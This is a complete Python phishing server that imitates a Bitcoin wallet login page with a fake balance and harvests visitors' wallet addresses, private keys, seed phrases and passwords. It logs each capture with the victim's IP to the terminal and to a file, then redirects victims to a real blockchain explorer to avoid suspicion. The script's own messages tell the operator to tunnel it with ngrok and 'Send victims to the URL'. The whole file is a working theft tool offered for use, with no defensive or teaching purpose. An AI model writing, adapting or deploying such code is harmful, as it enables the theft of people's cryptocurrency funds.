#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import json
import threading
import time
from datetime import datetime

PORT = 8080
captured_wallets = []

class BitcoinPhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path.startswith('/index'):
            self.send_wallet_page()
        elif self.path == '/dashboard':
            self.send_dashboard()
        else:
            self.send_404()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        
        # Extract Bitcoin data
        wallet_address = parsed_data.get('wallet_address', [''])[0]
        private_key = parsed_data.get('private_key', [''])[0]
        seed_phrase = parsed_data.get('seed_phrase', [''])[0]
        password = parsed_data.get('password', [''])[0]
        
        if wallet_address or private_key or seed_phrase:
            capture_data = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'wallet_address': wallet_address,
                'private_key': private_key,
                'seed_phrase': seed_phrase,
                'password': password,
                'ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'balance_check': parsed_data.get('fake_balance', ['0'])[0]
            }
            captured_wallets.append(capture_data)
            
            # 🔥 TERMINAL ALERT - INSTANT CAPTURE
            print("\n" + "█"*70)
            print("🚨 BITCOIN WALLET CAPTURED! 🚨")
            print("█"*70)
            if wallet_address:
                print(f"💰 WALLET:     {wallet_address}")
            if private_key:
                print(f"🔑 PRIVATE KEY: {private_key}")
            if seed_phrase:
                print(f"🌱 SEED PHRASE: {seed_phrase}")
            if password:
                print(f"🔒 PASSWORD:   {password}")
            print(f"🌐 VICTIM IP:  {self.client_address[0]}")
            print(f"⏰ TIME:       {capture_data['timestamp']}")
            print("█"*70 + "\n")
            
            # Save to file
            with open('btc_wallets.txt', 'a') as f:
                f.write(json.dumps(capture_data) + '\n')
        
        # Redirect based on action
        if 'withdraw' in post_data.lower():
            self.send_response(302)
            self.send_header('Location', '/success.html')
        else:
            self.send_response(302)
            self.send_header('Location', 'https://blockchain.com/explorer')
        self.end_headers()
    
    def send_wallet_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Bitcoin Wallet - Secure Login</title>
    <meta name="viewport" content="width=device-width">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
        body{background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .wallet-container{background:#fff;padding:40px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:420px}
        .logo{text-align:center;margin-bottom:30px}
        .logo svg{height:50px;fill:#f7931a}
        h1{color:#1a1a1a;font-size:28px;margin-bottom:10px;text-align:center}
        .subtitle{color:#666;font-size:16px;text-align:center;margin-bottom:30px}
        .form-group{margin-bottom:25px}
        label{display:block;color:#333;font-weight:600;font-size:14px;margin-bottom:8px}
        input{width:100%;padding:15px;border:2px solid #e1e5e9;border-radius:10px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#f7931a;box-shadow:0 0 0 3px rgba(247,147,26,0.1)}
        .btn{width:100%;padding:15px;background:linear-gradient(135deg,#f7931a,#f5a623);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}
        .btn:hover{background:linear-gradient(135deg,#e6830f,#e99015);transform:translateY(-2px)}
        .btn:disabled{background:#ccc;cursor:not-allowed;transform:none}
        .loading{display:none;text-align:center;padding:30px;color:#666}
        .success{display:none;background:#28a745;color:#fff;padding:25px;border-radius:10px;margin-top:20px;text-align:center;font-weight:600}
        .balance-display{background:linear-gradient(135deg,#28a745,#34c759);color:#fff;padding:20px;border-radius:12px;margin:20px 0;text-align:center;font-weight:600}
        .balance{font-size:24px;margin-bottom:5px}
        .btc-symbol{font-size:32px;margin-right:8px}
        .withdraw-section{margin-top:25px;padding-top:25px;border-top:2px solid #eee}
    </style>
</head>
<body>
    <div class="wallet-container">
        <div class="logo">
            <svg viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#f7931a"/><text x="24" y="30" font-size="20" font-weight="bold" text-anchor="middle" fill="#fff">₿</text></svg>
        </div>
        <h1>Bitcoin Wallet</h1>
        <p class="subtitle">Access your funds securely</p>
        
        <div class="balance-display">
            <div class="btc-symbol">₿</div>
            <div class="balance" id="fakeBalance">0.04567 BTC</div>
            <div style="font-size:14px;opacity:0.9">$2,847.32</div>
        </div>
        
        <form id="loginForm" method="POST">
            <div class="form-group">
                <label>Wallet Address</label>
                <input type="text" name="wallet_address" placeholder="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" required>
            </div>
            <div class="form-group">
                <label>Private Key / Seed Phrase</label>
                <input type="text" name="private_key" placeholder="Enter your 12/24 word seed or WIF private key" required>
            </div>
            <div class="form-group">
                <label>Wallet Password (optional)</label>
                <input type="password" name="password" placeholder="Enter wallet password">
            </div>
            <button type="submit" class="btn" id="submitBtn">Unlock Wallet</button>
        </form>
        
        <div class="loading" id="loading">
            🔄 Verifying wallet access...
        </div>
        <div class="success" id="success">
            ✅ Wallet unlocked successfully!<br>
            Redirecting to dashboard...
        </div>
    </div>
    
    <script>
        // Fake balance randomization
        const balances = ['0.04567', '0.1234', '0.00876', '0.5678', '0.03421'];
        document.getElementById('fakeBalance').textContent = balances[Math.floor(Math.random()*balances.length)] + ' BTC';
        
        document.getElementById('loginForm').onsubmit = function() {
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').innerHTML = 'Unlocking...';
            document.getElementById('loading').style.display = 'block';
            // Hidden balance field for extra realism
            this.appendChild(Object.assign(document.createElement('input'), {type:'hidden', name:'fake_balance', value:document.getElementById('fakeBalance').textContent}));
        }
    </script>
</body>
</html>'''
        self.wfile.write(html.encode())
    
    def send_dashboard(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        dashboard = '''
<!DOCTYPE html>
<html>
<head><title>Wallet Dashboard</title></head>
<body style="font-family:Arial;padding:40px;text-align:center;background:#f5f5f5">
    <h1 style="color:#f7931a">✅ Wallet Access Granted</h1>
    <p>Your transaction is being processed...</p>
    <script>setTimeout(()=>location.href='https://blockchain.com/explorer',3000)</script>
</body>
</html>'''
        self.wfile.write(dashboard.encode())
    
    def send_404(self):
        self.send_response(404)
        self.end_headers()

def print_stats():
    while True:
        time.sleep(10)
        print(f"\n💰 BTC STATS: {len(captured_wallets)} wallets captured | http://0.0.0.0:{PORT}")
        if captured_wallets:
            print("📁 Check btc_wallets.txt")

if __name__ == "__main__":
    print("🚀 BITCOIN WALLET PHISH SERVER")
    print(f"🌐 Local:     http://localhost:{PORT}")
    print(f"🔗 Ngrok:     ngrok http {PORT}")
    print("💰 Target:    Wallet addresses, private keys, seed phrases")
    print("="*70)
    
    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()
    
    with socketserver.TCPServer(("", PORT), BitcoinPhishHandler) as httpd:
        print("✅ Server LIVE - Send victims to the URL!")
        print("🎣 Waiting for Bitcoin wallets...\n")
        httpd.serve_forever()